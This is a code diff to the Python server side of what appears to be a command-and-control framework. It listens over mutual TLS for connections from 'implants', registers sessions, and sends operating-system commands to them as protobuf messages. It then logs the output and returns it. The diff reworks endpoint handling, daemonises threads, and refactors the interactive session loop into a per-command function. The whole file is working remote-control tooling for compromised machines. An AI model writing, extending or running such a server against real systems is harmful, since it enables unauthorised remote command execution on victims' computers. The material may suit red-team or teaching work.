@@ -4,14 +4,12 @@ import logging
 import socket
 import ssl
 import threading
-import urllib
 import uuid
 import sys
-from certs.certs import cert_generator
-from pb import implantpb_pb2
+from client.certs.certs import cert_generator
+from client.pb import implantpb_pb2
 from queue import Queue
 from typing import Tuple
-import urllib.parse
 
 
 # A thread safe dict of sessions and their ids
@@ -45,8 +43,8 @@ class Sessions:
 
 
 class Listener:
-    def __init__(self, requestq: Queue, endpoint: str):
-        self.host, self.port = self._parse_endpoint(endpoint)
+    def __init__(self, requestq: Queue, endpoint : Tuple [str, int]):
+        self.host, self.port = endpoint
         self.sessions = Sessions()
         # Automatically generate CA certificates for the server
         self.Server_Certificate_Generator = cert_generator('server', client=False) #This 'server' is the hostname for the cert
@@ -60,18 +58,9 @@ class Listener:
         self.ssock = self._mkssock(ctx)
 
         # start accepting connections
-        t = threading.Thread(target=self._accept, args=(requestq,))
+        t = threading.Thread(target=self._accept, args=(requestq,), daemon=True)
         t.start()
 
-    def _parse_endpoint(self, endpoint: str) -> Tuple[str, int]:
-        result = urllib.parse.urlsplit(f"//{endpoint}")
-        if result.hostname is None:
-            raise ValueError(f"Invalid hostname in endpoint {endpoint}")
-
-        if result.port is None:
-            raise ValueError(f"Invalid port in endpoint {endpoint}")
-
-        return result.hostname, result.port
 
     def _mtls_cfg(self) -> ssl.SSLContext:
         # mTLS settings
@@ -94,16 +83,16 @@ class Listener:
             conn, addr = self.ssock.accept()
             print(f"Accepted connection from {addr}")
             # conn.verify_client_post_handshake()
-            threading.Thread(target=self._handle_conn, args=(requestq, conn, addr)).start()
+            threading.Thread(target=self._handle_conn, args=(requestq, conn, addr), daemon=True).start()
 
     def _handle_conn(self, requestq: Queue, conn: ssl.SSLSocket, addr):
-        # Send the registration to the handler
-        data = conn.recv(2048)
-        requestq.put((data, addr))
-
         # Add the session
         id = self.sessions.add(conn, addr)
         print(f"implant ID: {id}")
+
+        # Send the registration to the handler with session id
+        data = conn.recv(2048)
+        requestq.put((data, addr, id))
 
         # TODO: Authenticate the implant before sending a confirmation
         confirmation = implantpb_pb2.Message(
@@ -117,38 +106,37 @@ class Listener:
 
 
 # Send data to implant
-def session(conn: ssl.SSLSocket):
-    while True:
-        userin = input("[session] > ")
-        if userin == "exit":
-            break
+def session(conn: ssl.SSLSocket, userin):
+    # Turn the cmd into a protobuf Message
+    os_cmd = implantpb_pb2.OsCmd(cmd=userin)
+    message = implantpb_pb2.Message(
+        message_type=implantpb_pb2.Message.MessageType.OsCmd,
+        data=os_cmd.SerializeToString()
+    )
+    conn.sendall(message.SerializeToString())
+    data = conn.recv(1024)
 
-        # Turn the cmd into a protobuf Message
-        os_cmd = implantpb_pb2.OsCmd(cmd=userin)
-        message = implantpb_pb2.Message(
-            message_type=implantpb_pb2.Message.MessageType.OsCmd,
-            data=os_cmd.SerializeToString()
-        )
-        conn.sendall(message.SerializeToString())
-        data = conn.recv(1024)
-        if not data:
-            break
-        else:
-            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
-            # Decode the data into OsCmdOutput
-            message = implantpb_pb2.Message()
-            message.ParseFromString(data)
-            if message.message_type == implantpb_pb2.Message.MessageType.OsCmdOutput:
-                output = implantpb_pb2.OsCmdOutput()
-                output.ParseFromString(message.data)
-                logging.info(output.stdout)
-                if output.HasField("status") and output.code != 0:
-                    print(f"Status code: {output.code}")
-                if len(output.stderr) > 0:
-                    print("stdout:")
-                    sys.stdout.buffer.write(output.stdout)
-                    print()
-                    print("stderr:")
-                    sys.stdout.buffer.write(output.stderr)
-                else:
-                    sys.stdout.buffer.write(output.stdout)
+    if not data:
+        return 
+
+    else:
+        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
+        # Decode the data into OsCmdOutput
+        message = implantpb_pb2.Message()
+        message.ParseFromString(data)
+        if message.message_type == implantpb_pb2.Message.MessageType.OsCmdOutput:
+            output = implantpb_pb2.OsCmdOutput()
+            output.ParseFromString(message.data)
+            logging.info(output.stdout)
+
+            result = b""
+            if output.HasField("status") and output.code != 0:
+                result += f"Status code: {output.code}\n".encode()
+
+            if len(output.stderr) > 0:
+                result += b"stdout:\n" +output.stdout + b"\nstderr:\n" + output.stderr
+
+            else:
+                result += output.stdout
+
+            return result
